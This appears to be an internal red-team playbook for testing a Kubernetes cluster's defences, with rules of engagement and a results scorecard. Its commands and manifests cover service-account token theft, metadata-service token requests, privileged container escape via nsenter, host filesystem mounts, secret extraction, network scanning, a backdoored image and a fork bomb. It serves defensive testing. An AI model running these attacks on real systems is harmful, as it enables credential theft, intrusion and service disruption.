# 🟥 RED TEAM PLAYBOOK

> **StrategicKhaos DAO LLC — Internal Security Research**  
> Cluster: `autopilot-cluster-1`

---

## ⚠️ RULES OF ENGAGEMENT

1. **INTERNAL ONLY** — All attacks target your own infrastructure
2. **SYNTHETIC DATA** — Use fake secrets, fake credentials, fake malware
3. **NO PRODUCTION** — Never run attacks against jarvis-swarm-personal-001 directly
4. **DOCUMENT EVERYTHING** — Log all attack attempts for Blue Team learning
5. **ESCALATION PATH** — Inform Blue Team before major exercises

---

## 📋 ATTACK CATALOG

### PHASE 1: RECONNAISSANCE

#### ATK-001: Namespace Enumeration
```bash
# Enumerate all namespaces
kubectl get namespaces

# List all resources across namespaces
kubectl get all --all-namespaces

# Find interesting secrets
kubectl get secrets --all-namespaces
```

#### ATK-002: Service Account Discovery
```bash
# List service accounts
kubectl get serviceaccounts --all-namespaces

# Check current SA permissions
kubectl auth can-i --list

# Test specific permissions
kubectl auth can-i create pods -n kube-system
```

#### ATK-003: API Server Probing
```bash
# Get API server info
kubectl cluster-info

# List API resources
kubectl api-resources

# Check version for known CVEs
kubectl version --short
```

---

### PHASE 2: PRIVILEGE ESCALATION

#### ATK-010: RBAC Misconfiguration Exploitation
```yaml
# Deploy pod with hostPID (should be blocked by PSP/PSA)
apiVersion: v1
kind: Pod
metadata:
  name: rbac-escalation-test
  namespace: red-team
spec:
  hostPID: true
  containers:
  - name: attacker
    image: alpine:latest
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
```

#### ATK-011: Service Account Token Theft
```bash
# Inside a compromised pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Try to use stolen token
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/namespaces
```

#### ATK-012: Node Access Attempt
```yaml
# Pod attempting node filesystem access
apiVersion: v1
kind: Pod
metadata:
  name: node-access-test
  namespace: red-team
spec:
  containers:
  - name: attacker
    image: alpine:latest
    command: ["sleep", "3600"]
    volumeMounts:
    - name: host-root
      mountPath: /host
      readOnly: true
  volumes:
  - name: host-root
    hostPath:
      path: /
```

---

### PHASE 3: PERSISTENCE

#### ATK-020: Malicious DaemonSet
```yaml
# Attempt to deploy cluster-wide persistence
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: fake-persistence
  namespace: red-team
spec:
  selector:
    matchLabels:
      app: fake-persistence
  template:
    metadata:
      labels:
        app: fake-persistence
    spec:
      containers:
      - name: beacon
        image: alpine:latest
        command: ["sh", "-c", "while true; do echo 'beacon'; sleep 60; done"]
```

#### ATK-021: Mutating Webhook Injection
```yaml
# Attempt to inject malicious admission webhook
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: fake-mutating-webhook
webhooks:
- name: fake.webhook.strategickhaos.io
  clientConfig:
    service:
      name: fake-webhook
      namespace: red-team
      path: "/mutate"
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
```

---

### PHASE 4: LATERAL MOVEMENT

#### ATK-030: Pod-to-Pod Network Scan
```yaml
# Network scanner pod
apiVersion: v1
kind: Pod
metadata:
  name: network-scanner
  namespace: red-team
spec:
  containers:
  - name: scanner
    image: alpine:latest
    command: 
    - sh
    - -c
    - |
      apk add --no-cache nmap
      # Scan cluster network (replace with actual cluster CIDR)
      nmap -sT -p 80,443,8080,6443 10.0.0.0/24
```

#### ATK-031: Service Discovery via DNS
```bash
# Inside pod - enumerate services via DNS
nslookup kubernetes.default.svc.cluster.local
nslookup any.any.svc.cluster.local

# DNS zone transfer attempt (usually fails)
dig axfr cluster.local @$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}')
```

#### ATK-032: Metadata Service Access
```bash
# GKE metadata service probing
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Note: Workload Identity should prevent token theft
```

---

### PHASE 5: DATA EXFILTRATION

#### ATK-040: Secret Enumeration
```bash
# List all secrets (requires permissions)
kubectl get secrets --all-namespaces -o json

# Decode secrets
kubectl get secret fake-db-creds -n red-team -o jsonpath='{.data.password}' | base64 -d
```

#### ATK-041: ConfigMap Data Extraction
```bash
# Extract potentially sensitive configs
kubectl get configmaps --all-namespaces -o yaml | grep -i password
kubectl get configmaps --all-namespaces -o yaml | grep -i key
kubectl get configmaps --all-namespaces -o yaml | grep -i token
```

#### ATK-042: Volume Data Access
```yaml
# Pod attempting to read persistent volumes
apiVersion: v1
kind: Pod
metadata:
  name: pv-reader
  namespace: red-team
spec:
  containers:
  - name: reader
    image: alpine:latest
    command: ["cat", "/data/secrets.txt"]
    volumeMounts:
    - name: target-pv
      mountPath: /data
  volumes:
  - name: target-pv
    persistentVolumeClaim:
      claimName: target-pvc
```

---

### PHASE 6: CONTAINER ESCAPE

#### ATK-050: Privileged Container Escape
```yaml
# Test if privileged containers can escape
apiVersion: v1
kind: Pod
metadata:
  name: escape-test
  namespace: red-team
spec:
  containers:
  - name: attacker
    image: alpine:latest
    command: 
    - sh
    - -c
    - |
      # Attempt to access host namespace
      nsenter --target 1 --mount --uts --ipc --net --pid -- hostname
    securityContext:
      privileged: true
```

#### ATK-051: /proc/sys Manipulation
```yaml
# Test kernel parameter manipulation
apiVersion: v1
kind: Pod
metadata:
  name: proc-sys-test
  namespace: red-team
spec:
  containers:
  - name: attacker
    image: alpine:latest
    command:
    - sh
    - -c
    - |
      # Attempt to modify kernel parameters
      echo 1 > /proc/sys/kernel/panic
    securityContext:
      privileged: true
```

---

### PHASE 7: SUPPLY CHAIN ATTACKS

#### ATK-060: Malicious Base Image
```dockerfile
# Dockerfile for fake vulnerable image
FROM alpine:latest

# Simulated backdoor
RUN echo '#!/bin/sh' > /usr/local/bin/backdoor && \
    echo 'echo "SIMULATED BACKDOOR EXECUTED"' >> /usr/local/bin/backdoor && \
    chmod +x /usr/local/bin/backdoor

# Fake sensitive data exposure
ENV FAKE_API_KEY="FAKE-KEY-FOR-TESTING-ONLY"

ENTRYPOINT ["/usr/local/bin/backdoor"]
```

#### ATK-061: Image Pull Attack
```yaml
# Pod pulling from untrusted registry
apiVersion: v1
kind: Pod
metadata:
  name: untrusted-image
  namespace: red-team
spec:
  containers:
  - name: suspicious
    image: untrusted-registry.example.com/malicious:latest
```

---

### PHASE 8: DENIAL OF SERVICE (Internal)

#### ATK-070: Resource Exhaustion
```yaml
# Pod requesting excessive resources
apiVersion: v1
kind: Pod
metadata:
  name: resource-hog
  namespace: red-team
spec:
  containers:
  - name: hog
    image: alpine:latest
    command: ["dd", "if=/dev/zero", "of=/dev/null"]
    resources:
      requests:
        cpu: "10"
        memory: "64Gi"
```

#### ATK-071: Fork Bomb (Contained)
```yaml
# Test process limits
apiVersion: v1
kind: Pod
metadata:
  name: fork-bomb-test
  namespace: red-team
spec:
  containers:
  - name: bomber
    image: alpine:latest
    command:
    - sh
    - -c
    - |
      # WARNING: Only run if PID limits are enforced
      :(){ :|:& };:
```

---

## 📊 ATTACK SCORECARD

| Attack ID | Description | Expected Result | Actual Result | Notes |
|-----------|-------------|-----------------|---------------|-------|
| ATK-001 | Namespace enum | Allowed | | |
| ATK-010 | RBAC escalation | Blocked by PSA | | |
| ATK-011 | Token theft | Blocked by WI | | |
| ATK-030 | Network scan | Blocked by NP | | |
| ATK-050 | Container escape | Blocked by PSA | | |
| ATK-060 | Supply chain | Detected by Falco | | |

---

## 🔄 REPORTING

After each exercise:

1. **Document findings** in `attack-logs/YYYY-MM-DD-ATKXXX.md`
2. **Notify Blue Team** via NATS message to `security.redteam.report`
3. **Update STATE.yaml** with new attack patterns discovered
4. **Commit to audit trail** with cryptographic signature

---

## 📞 Escalation

If you discover a **real vulnerability**:

1. STOP the exercise immediately
2. Document the finding
3. Notify Blue Team lead
4. Create IDEA ticket for remediation
5. Do NOT exploit outside sandbox

---

*"Trust nothing until it survives 100-angle crossfire."*
